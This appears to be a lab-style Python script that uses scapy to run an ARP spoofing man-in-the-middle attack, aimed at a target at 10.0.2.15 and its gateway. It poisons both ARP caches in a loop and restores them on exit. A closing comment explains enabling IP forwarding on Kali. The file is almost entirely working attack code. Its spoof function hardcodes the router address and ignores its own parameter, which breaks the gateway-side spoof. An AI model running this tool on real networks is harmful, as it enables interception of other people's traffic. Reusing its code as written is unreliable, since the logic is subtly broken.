#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # who has this IP?
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # sned to broadcast address, so everybody will receive it
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # send packet to the network and receive it
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    # fool target machine (10.0.2.15) that we are router (10.0.2.1)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc="10.0.2.1")
    # send packet
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets sent: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] reseting ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)

# enable port forwarding on Kali if target is losing connection
# echo 1 > /proc/sys/net/ipv4/ip_forward




